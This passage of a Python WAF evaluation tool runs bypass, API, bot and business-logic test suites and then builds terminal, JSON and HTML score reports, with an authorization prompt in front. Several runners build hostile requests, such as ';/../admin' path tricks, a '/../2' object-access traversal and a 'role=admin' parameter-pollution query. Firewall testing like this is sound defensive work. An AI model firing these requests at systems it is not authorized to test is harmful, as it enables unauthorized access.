        headers = build_headers(run_opts, override_ua=t["ua"])
        if t.get("strip_headers"):
            headers.pop("Accept", None)
            headers.pop("Accept-Language", None)
        res = make_request(url, headers=headers, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"))
        ev = evaluate(res, baseline)
        results.append({
            "id": t["id"], "name": t["name"], "category": "Bot Detection",
            "tags": t["tags"], "payload_display": t["desc"],
            "status": res["status"], "latency": res["latency"],
            "blocked": ev["blocked"], "confidence": ev["confidence"], "reason": ev["reason"],
        })
        progress.advance(task)
        time.sleep(0.2)
    return results


def run_bypass(url: str, run_opts: dict, baseline: Optional[dict], progress, task) -> list:
    results = []
    parsed = urllib.parse.urlparse(url)

    for t in get_bypass_tests():
        mode = t.get("mode", "query")
        headers = build_headers(run_opts)

        if mode == "query":
            parts = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parts.query)
            qs["q"] = [t["payload"]]
            new_url = urllib.parse.urlunparse(parts._replace(query=urllib.parse.urlencode(qs, doseq=True)))
            res = make_request(new_url, headers=headers, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"))
        elif mode == "header_inject":
            headers.update(t.get("extra_headers", {}))
            try:
                res = make_request(url, headers=headers, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"))
            except Exception as e:
                res = {"status": None, "body": "", "headers": {}, "latency": 0, "error": str(e)}
        elif mode == "path_override":
            suffix = t.get("path_suffix", "")
            if suffix == "double_slash":
                new_path = "//" + (parsed.path or "/")
            elif suffix == "semicolon":
                new_path = (parsed.path or "/") + ";/../admin"
            else:
                new_path = parsed.path
            res = make_request(url, headers=headers, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"), override_path=new_path)
        else:
            res = make_request(url, headers=headers, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"))

        ev = evaluate(res, baseline)
        blocked = True if (mode == "header_inject" and res.get("error") and "invalid" in str(res.get("error","")).lower()) else ev["blocked"]
        confidence = "high" if (mode == "header_inject" and res.get("error")) else ev["confidence"]
        reason = f"Blocked at transport layer: {res['error']}" if (mode == "header_inject" and res.get("error")) else ev["reason"]

        results.append({
            "id": t["id"], "name": t["name"], "category": "Bypass",
            "tags": t["tags"], "payload_display": t["desc"],
            "status": res["status"], "latency": res["latency"],
            "blocked": blocked, "confidence": confidence, "reason": reason,
        })
        progress.advance(task)
        time.sleep(0.2)
    return results


def run_api(url: str, run_opts: dict, baseline: Optional[dict], progress, task) -> list:
    results = []
    parsed = urllib.parse.urlparse(url)

    for t in get_api_tests():
        headers = build_headers(run_opts)
        method = t.get("method", "GET")
        body = t.get("body")
        path_override = None

        if "extra_headers" in t:
            headers.update(t["extra_headers"])
        if "content_type" in t:
            headers["Content-Type"] = t["content_type"]
        if t.get("path_override") == "bola":
            orig = parsed.path.rstrip("/")
            path_override = orig + "/../2" if orig else "/1/../2"

        res = make_request(url, method=method, headers=headers, body=body,
                           timeout=run_opts["timeout"], override_path=path_override,
                           proxies=run_opts.get("proxy"))
        ev = evaluate(res, baseline)
        results.append({
            "id": t["id"], "name": t["name"], "category": "API Security",
            "tags": t["tags"], "payload_display": t["name"],
            "status": res["status"], "latency": res["latency"],
            "blocked": ev["blocked"], "confidence": ev["confidence"], "reason": ev["reason"],
        })
        progress.advance(task)
        time.sleep(0.2)
    return results


def run_bizlogic(url: str, run_opts: dict, baseline: Optional[dict], progress, task) -> list:
    results = []
    parsed = urllib.parse.urlparse(url)

    for t in get_bizlogic_tests():
        headers = build_headers(run_opts)
        method = t.get("method", "GET")
        body = t.get("body")
        path_override = None

        if "content_type" in t:
            headers["Content-Type"] = t["content_type"]

        po = t.get("path_override")
        if po == "admin":
            path_override = (parsed.path or "/").rstrip("/") + "/admin"
        elif po == "hpp":
            path_override = None
            qs = urllib.parse.urlencode([("role", "user"), ("role", "admin")])
            url_hpp = urllib.parse.urlunparse(parsed._replace(query=qs))
            res = make_request(url_hpp, method=method, headers=headers, body=body, timeout=run_opts["timeout"], proxies=run_opts.get("proxy"))
            ev = evaluate(res, baseline)
            results.append({
                "id": t["id"], "name": t["name"], "category": "Business Logic",
                "tags": t["tags"], "payload_display": t["name"],
                "status": res["status"], "latency": res["latency"],
                "blocked": ev["blocked"], "confidence": ev["confidence"], "reason": ev["reason"],
            })
            progress.advance(task)
            time.sleep(0.2)
            continue
        elif po == "user_verbose":
            path_override = (parsed.path or "/").rstrip("/") + "/user/99999999"
        elif po == "internal":
            path_override = (parsed.path or "/").rstrip("/") + "/internal/health"

        res = make_request(url, method=method, headers=headers, body=body,
                           timeout=run_opts["timeout"], override_path=path_override,
                           proxies=run_opts.get("proxy"))
        ev = evaluate(res, baseline)
        results.append({
            "id": t["id"], "name": t["name"], "category": "Business Logic",
            "tags": t["tags"], "payload_display": t["name"],
            "status": res["status"], "latency": res["latency"],
            "blocked": ev["blocked"], "confidence": ev["confidence"], "reason": ev["reason"],
        })
        progress.advance(task)
        time.sleep(0.2)
    return results


# ── Terminal UI ────────────────────────────────────────────────────────────────

def render_tag(tag: str) -> Text:
    prefix = tag.split(":")[0]
    color = TAG_COLORS.get(prefix, "grey50")
    t = Text(tag, style=f"{color} bold")
    return t


def print_banner():
    console.print()
    console.rule("[bold cyan]WAF TESTER[/bold cyan] [dim]v" + VERSION + "[/dim]", style="cyan")
    console.print("[dim]Enterprise WAF Evaluation Tool — 90 tests · 6 suites · OWASP / CWE / NIST / PCI-DSS[/dim]", justify="center")
    console.print()


def print_suite_results(suite_name: str, results: list):
    blocked = sum(1 for r in results if r["blocked"] is True)
    total = len(results)
    score = round((blocked / total) * 100) if total else 0
    score_color = "green" if score >= 80 else "yellow" if score >= 50 else "red"

    table = Table(
        title=f"[bold]{suite_name}[/bold]  [{score_color}]{score}%[/{score_color}] blocked",
        box=box.SIMPLE_HEAD, show_header=True, header_style="bold dim",
        title_justify="left", expand=True, pad_edge=False,
    )
    table.add_column("Test", style="white", no_wrap=False, min_width=30)
    table.add_column("Payload", style="cyan", max_width=30)
    table.add_column("Frameworks", no_wrap=False, max_width=24)
    table.add_column("Status", justify="center", width=7)
    table.add_column("ms", justify="right", width=6)
    table.add_column("Result", width=18)
    table.add_column("Reason", style="dim", max_width=35)

    for r in results:
        blocked_val = r["blocked"]
        conf = r.get("confidence", "")
        status = str(r["status"]) if r["status"] else "–"
        latency = str(r["latency"])

        if blocked_val is True:
            conf_map = {"high": "bold green", "likely": "green", "uncertain": "yellow", "bypassed": "red"}
            conf_label = {"high": "✓ BLOCKED [HIGH]", "likely": "✓ BLOCKED [LIKELY]",
                          "uncertain": "✓ BLOCKED [?]", "bypassed": "✓ BLOCKED"}.get(conf, "✓ BLOCKED")
            result_text = Text(conf_label, style=conf_map.get(conf, "green"))
            status_style = "green"
        elif blocked_val is False:
            result_text = Text("✗ BYPASSED", style="red bold")
            status_style = "red"
        else:
            result_text = Text("? ERROR", style="dim")
            status_style = "dim"

        # Tag display
        tag_text = Text()
        for i, tag in enumerate(r.get("tags", [])):
            prefix = tag.split(":")[0]
            color = TAG_COLORS.get(prefix, "grey50")
            if i > 0:
                tag_text.append(" ")
            tag_text.append(tag, style=f"{color}")

        table.add_row(
            r["name"],
            (r.get("payload_display") or "")[:30],
            tag_text,
            Text(status, style=status_style),
            latency,
            result_text,
            r.get("reason", "")[:50],
        )

    console.print(table)


def print_summary(all_results: dict, baseline: Optional[dict]):
    console.print()
    console.rule("[bold]EVALUATION SUMMARY[/bold]", style="cyan")
    console.print()

    summary_table = Table(box=box.SIMPLE, show_header=True, header_style="bold dim", expand=False)
    summary_table.add_column("Suite", style="white", min_width=20)
    summary_table.add_column("Blocked", justify="right")
    summary_table.add_column("Total", justify="right")
    summary_table.add_column("Score", justify="right")
    summary_table.add_column("Rating", justify="center")

    total_blocked = 0
    total_tests = 0

    for suite, results in all_results.items():
        blocked = sum(1 for r in results if r["blocked"] is True)
        total = len(results)
        score = round((blocked / total) * 100) if total else 0
        total_blocked += blocked
        total_tests += total
        score_color = "green" if score >= 80 else "yellow" if score >= 50 else "red"
        rating = "●●●●●" if score >= 90 else "●●●●○" if score >= 80 else "●●●○○" if score >= 60 else "●●○○○" if score >= 40 else "●○○○○"
        summary_table.add_row(
            SUITE_LABELS.get(suite, suite),
            str(blocked), str(total),
            Text(f"{score}%", style=f"bold {score_color}"),
            Text(rating, style=score_color),
        )

    console.print(summary_table)

    overall = round((total_blocked / total_tests) * 100) if total_tests else 0
    grade = "A" if overall >= 90 else "B" if overall >= 80 else "C" if overall >= 65 else "D" if overall >= 50 else "F"
    overall_color = "green" if overall >= 80 else "yellow" if overall >= 50 else "red"

    console.print()
    console.print(f"  Overall WAF Score:  [{overall_color} bold]{overall}%[/{overall_color} bold]   Grade: [{overall_color} bold]{grade}[/{overall_color} bold]   ({total_blocked}/{total_tests} blocked)")

    if baseline:
        console.print(f"  [dim]Baseline: HTTP {baseline['status']} · {baseline['latency']}ms — confidence scoring active[/dim]")
    console.print()


# ── Report generation ──────────────────────────────────────────────────────────

def build_summary(all_results: dict) -> dict:
    summary = {}
    for suite, results in all_results.items():
        blocked = sum(1 for r in results if r["blocked"] is True)
        total = len(results)
        summary[suite] = {
            "total": total, "blocked": blocked,
            "bypassed": sum(1 for r in results if r["blocked"] is False),
            "errors": sum(1 for r in results if r["blocked"] is None),
            "score": round((blocked / total) * 100) if total else 0,
        }
    return summary


def save_json(all_results: dict, url: str, baseline: Optional[dict], output_dir: str) -> str:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(output_dir, f"waf_report_{ts}.json")
    report = {
        "tool": f"WAF Tester v{VERSION} (Python)",
        "target": url,
        "timestamp": datetime.now().isoformat(),
        "baseline": baseline,
        "summary": build_summary(all_results),
        "results": all_results,
    }
    with open(path, "w") as f:
        json.dump(report, f, indent=2)
    return path


def save_html(all_results: dict, url: str, baseline: Optional[dict], output_dir: str) -> str:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(output_dir, f"waf_report_{ts}.html")
    summary = build_summary(all_results)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    total_b = sum(s["blocked"] for s in summary.values())
    total_t = sum(s["total"] for s in summary.values())
    overall = round((total_b / total_t) * 100) if total_t else 0
    grade = "A" if overall >= 90 else "B" if overall >= 80 else "C" if overall >= 65 else "D" if overall >= 50 else "F"
    overall_color = "#00e676" if overall >= 80 else "#ffc107" if overall >= 50 else "#ff3d57"

    tag_css_colors = {"OWASP": "#f0883e", "CWE": "#79c0ff", "NIST": "#7ee787", "PCI": "#d2a8ff"}

    def tag_span(tag):
        prefix = tag.split(":")[0]
        color = tag_css_colors.get(prefix, "#8b949e")
        return f'<span style="border:1px solid {color};color:{color};font-size:9px;padding:1px 4px;border-radius:3px;font-family:monospace;margin-right:2px">{tag}</span>'

    cards_html = ""
    for suite, s in summary.items():
        sc = s["score"]
        color = "#00e676" if sc >= 80 else "#ffc107" if sc >= 50 else "#ff3d57"
        r = 30
        circ = 2 * 3.14159 * r
        offset = circ - (sc / 100) * circ
        cards_html += f"""
        <div style="background:#0d1e35;border:1px solid #1a3a5c;border-radius:10px;padding:16px 12px;text-align:center;">
          <svg width="72" height="72" viewBox="0 0 72 72" style="transform:rotate(-90deg)">
            <circle cx="36" cy="36" r="{r}" fill="none" stroke="#112240" stroke-width="5"/>
            <circle cx="36" cy="36" r="{r}" fill="none" stroke="{color}" stroke-width="5"
              stroke-dasharray="{circ:.1f}" stroke-dashoffset="{offset:.1f}" stroke-linecap="round"/>
          </svg>
          <div style="font-size:18px;font-weight:700;color:{color};margin-top:-44px;margin-bottom:28px">{sc}%</div>
          <div style="font-size:10px;color:#4a6580;text-transform:uppercase;letter-spacing:1px">{SUITE_LABELS.get(suite, suite)}</div>
          <div style="font-size:10px;color:#4a6580">{s['blocked']} / {s['total']}</div>
        </div>"""

    rows_html = ""
    for suite, results in all_results.items():
        for r in results:
            b = r["blocked"]
            conf = r.get("confidence", "")
            row_style = "border-left:2px solid #00c853" if b is True else "border-left:2px solid #d50032" if b is False else ""
            status_color = "#00e676" if (r["status"] and r["status"] >= 400) else "#4a6580"
            if b is True:
                conf_colors = {"high":"#00e676","likely":"#00b0cc","uncertain":"#ffc107"}
                result_html = f'<span style="color:{conf_colors.get(conf,"#00e676")};font-weight:700">✓ BLOCKED</span>'
                if conf in ("high","likely","uncertain"):
                    result_html += f' <span style="font-size:9px;border:1px solid {conf_colors.get(conf,"#00e676")};color:{conf_colors.get(conf,"#00e676")};padding:1px 4px;border-radius:3px">{conf.upper()}</span>'
            elif b is False:
                result_html = '<span style="color:#ff3d57;font-weight:700">✗ BYPASSED</span>'
            else:
                result_html = '<span style="color:#4a6580">? ERROR</span>'

            tags_html = "".join(tag_span(tag) for tag in r.get("tags", []))
            payload_esc = (r.get("payload_display","") or "")[:50].replace("<","&lt;").replace(">","&gt;")
            reason_esc = (r.get("reason","") or "").replace("<","&lt;").replace(">","&gt;")

            rows_html += f"""<tr style="{row_style}">
              <td><div style="font-weight:600;color:#cdd9e5">{r['name']}</div>
                  <div style="font-size:10px;color:#4a6580">{SUITE_LABELS.get(suite,suite)}</div></td>
              <td style="font-family:monospace;font-size:10px;color:#00b0cc;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="{payload_esc}">{payload_esc}</td>
              <td>{tags_html}</td>
              <td style="font-family:monospace;color:{status_color};font-weight:600">{r['status'] or '–'}</td>
              <td style="font-family:monospace;font-size:10px;color:#4a6580">{r['latency']}ms</td>
              <td>{result_html}</td>
              <td style="font-size:10px;color:#4a6580;max-width:200px">{reason_esc}</td>
            </tr>"""

    baseline_html = ""
    if baseline:
        baseline_html = f'<div style="font-family:monospace;font-size:11px;color:#00b0cc;background:rgba(0,212,255,0.05);border:1px solid rgba(0,212,255,0.15);border-radius:6px;padding:8px 14px;margin-bottom:18px">▸ Baseline: HTTP {baseline["status"]} · {baseline["latency"]}ms — confidence scoring active</div>'

    html = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>WAF Tester Report — {url}</title>
<link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
* {{ box-sizing:border-box; margin:0; padding:0; }}
body {{ background:#060b14; color:#cdd9e5; font-family:'Exo 2',system-ui,sans-serif; font-size:14px; padding:40px; }}
body::before {{ content:''; position:fixed; inset:0; z-index:0;
  background-image:linear-gradient(rgba(0,212,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.03) 1px,transparent 1px);
  background-size:40px 40px; pointer-events:none; }}
.wrap {{ position:relative; z-index:1; max-width:1400px; margin:0 auto; }}
h1 {{ font-size:28px; font-weight:800; letter-spacing:2px; text-transform:uppercase; margin-bottom:4px; }}
h1 span {{ color:#00d4ff; }}
.meta {{ font-family:monospace; font-size:11px; color:#4a6580; margin-bottom:32px; }}
.cards {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:12px; margin-bottom:24px; }}
.overall {{ display:flex; align-items:center; gap:24px; padding:20px; background:#0a1628; border:1px solid #1a3a5c; border-radius:10px; margin-bottom:32px; }}
.overall-score {{ font-size:52px; font-weight:800; }}
.overall-grade {{ font-size:32px; font-weight:800; padding:8px 20px; border-radius:8px; }}
.overall-label {{ font-size:13px; font-weight:700; text-transform:uppercase; letter-spacing:1px; color:#4a6580; flex:1; }}
table {{ width:100%; border-collapse:collapse; background:#0a1628; border:1px solid #1a3a5c; border-radius:10px; overflow:hidden; }}
th {{ padding:10px 14px; text-align:left; font-family:monospace; font-size:9px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; color:#4a6580; border-bottom:1px solid #1a3a5c; background:#080e19; }}
td {{ padding:9px 14px; border-bottom:1px solid #0d1e35; vertical-align:middle; font-size:12px; }}
tr:hover td {{ background:rgba(0,212,255,0.02); }}
</style></head>
<body><div class="wrap">
<h1>WAF <span>Tester</span> Report</h1>
<div class="meta">// target: {url} &nbsp;·&nbsp; generated: {now} &nbsp;·&nbsp; WAF Tester v{VERSION} (Python)</div>
{baseline_html}
<div class="cards">{cards_html}</div>
<div class="overall">
  <div class="overall-label">Overall WAF Score</div>
  <div class="overall-score" style="color:{overall_color}">{overall}%</div>
  <div class="overall-grade" style="color:{overall_color};background:rgba(0,0,0,0.2);border:1px solid {overall_color}">{grade}</div>
</div>
<table>
<thead><tr><th>Test</th><th>Payload</th><th>Frameworks</th><th>Status</th><th>Latency</th><th>Result</th><th>Reason</th></tr></thead>
<tbody>{rows_html}</tbody>
</table>
</div></body></html>"""

    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    return path


# ── Main ───────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        description="WAF Tester — Enterprise WAF Evaluation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="⚠️  Only test systems you own or have explicit written permission to test."
    )
    p.add_argument("--url", required=True, help="Target URL")
    p.add_argument("--suites", default="owasp,ratelimit,bot,bypass,api,bizlogic",
                   help="Comma-separated suites (default: all)")
    p.add_argument("--auth-type", choices=["none","bearer","apikey","cookie","basic"], default="none")
    p.add_argument("--auth-value", default="", help="Token, cookie string, or API key value")
    p.add_argument("--auth-header", default="X-API-Key", help="Header name for apikey auth")
    p.add_argument("--auth-user", default="", help="Username for basic auth")
    p.add_argument("--auth-pass", default="", help="Password for basic auth")
    p.add_argument("--no-baseline", action="store_true", help="Disable baseline comparison")
    p.add_argument("--no-rotate-ua", action="store_true", help="Disable User-Agent rotation")
    p.add_argument("--waf-header", action="store_true", help="Send X-WAF-Tester identification header")
    p.add_argument("--output", default="terminal,json,html", help="Output modes (default: terminal,json,html)")
    p.add_argument("--output-dir", default=".", help="Directory for report files")
    p.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    p.add_argument("--proxy", default=None,
                   help="Proxy URL for all requests (e.g. http://127.0.0.1:8080 for Burp Suite)")
    p.add_argument("--confirm", action="store_true", help="Skip authorization confirmation prompt")
    return p.parse_args()


def main():
    args = parse_args()
    print_banner()

    # Authorization gate
    if not args.confirm:
        console.print("[yellow bold]⚠️  AUTHORIZATION REQUIRED[/yellow bold]")
        console.print("[dim]This tool sends real attack payloads to the target URL.[/dim]")
        console.print("[dim]Only test systems you own or have explicit written permission to test.[/dim]")
        console.print()
        confirm = console.input("  I confirm I am authorized to test this system [yes/no]: ").strip().lower()
        if confirm not in ("yes", "y"):
            console.print("[red]Aborted.[/red]")
            sys.exit(0)
        console.print()

    # Build run options
    auth = None
    if args.auth_type != "none":
        auth = {"type": args.auth_type, "value": args.auth_value,
                "header_name": args.auth_header, "user": args.auth_user, "pass": args.auth_pass}

    run_opts = {
        "rotate_ua":  not args.no_rotate_ua,
        "waf_header": args.waf_header,
        "auth":       auth,
        "timeout":    args.timeout,
        "proxy":      {"http": args.proxy, "https": args.proxy} if args.proxy else None,
    }

    suites = [s.strip() for s in args.suites.split(",") if s.strip()]
    outputs = [o.strip() for o in args.output.split(",")]
    os.makedirs(args.output_dir, exist_ok=True)

    # Baseline
    baseline = None
    if not args.no_baseline:
        console.print("[dim]Fetching baseline response…[/dim]")
        res = make_request(args.url, headers=build_headers(run_opts), timeout=args.timeout, proxies=run_opts.get("proxy"))
        if not res["error"]:
            baseline = {"status": res["status"], "body": res["body"], "latency": res["latency"]}
            console.print(f"[dim]Baseline: HTTP {baseline['status']} · {baseline['latency']}ms[/dim]")
        console.print()

    if args.proxy:
        console.print(f"[cyan]⇄ Proxy:[/cyan] all traffic routed through [cyan]{args.proxy}[/cyan]")
        console.print()

    # Calculate total tests
    suite_runner_totals = {"owasp": len(get_owasp_tests()), "ratelimit": 3,
                           "bot": len(get_bot_tests()), "bypass": len(get_bypass_tests()),
                           "api": len(get_api_tests()), "bizlogic": len(get_bizlogic_tests())}
    total = sum(suite_runner_totals.get(s, 0) for s in suites)

    # Run tests with progress bar
    all_results = {}
    with Progress(
        SpinnerColumn(style="cyan"),
        TextColumn("[bold cyan]{task.description}[/bold cyan]"),
        BarColumn(bar_width=40, style="cyan", complete_style="bright_cyan"),
        TaskProgressColumn(),
        TextColumn("[dim]{task.completed}/{task.total}[/dim]"),
        console=console, refresh_per_second=10,
    ) as progress:
        main_task = progress.add_task("Running tests", total=total)

        suite_fns = {
            "owasp":    lambda p, t: run_owasp(args.url, run_opts, baseline, p, t),
            "ratelimit":lambda p, t: run_ratelimit(args.url, run_opts, p, t),
            "bot":      lambda p, t: run_bot(args.url, run_opts, baseline, p, t),
            "bypass":   lambda p, t: run_bypass(args.url, run_opts, baseline, p, t),
            "api":      lambda p, t: run_api(args.url, run_opts, baseline, p, t),
            "bizlogic": lambda p, t: run_bizlogic(args.url, run_opts, baseline, p, t),
        }

        for suite in suites:
            if suite not in suite_fns:
                console.print(f"[yellow]Unknown suite: {suite}[/yellow]")
                continue
            progress.update(main_task, description=f"[bold cyan]{SUITE_LABELS.get(suite, suite)}[/bold cyan]")
            results = suite_fns[suite](progress, main_task)
            all_results[suite] = results

    # Print terminal output
    if "terminal" in outputs:
        console.print()
        for suite, results in all_results.items():
            print_suite_results(SUITE_LABELS.get(suite, suite), results)
        print_summary(all_results, baseline)

    # Save reports
    if "json" in outputs:
        json_path = save_json(all_results, args.url, baseline, args.output_dir)
        console.print(f"[green]✓[/green] JSON report saved: [cyan]{json_path}[/cyan]")

    if "html" in outputs:
        html_path = save_html(all_results, args.url, baseline, args.output_dir)
        console.print(f"[green]✓[/green] HTML report saved: [cyan]{html_path}[/cyan]")

    console.print()


if __name__ == "__main__":
    main()
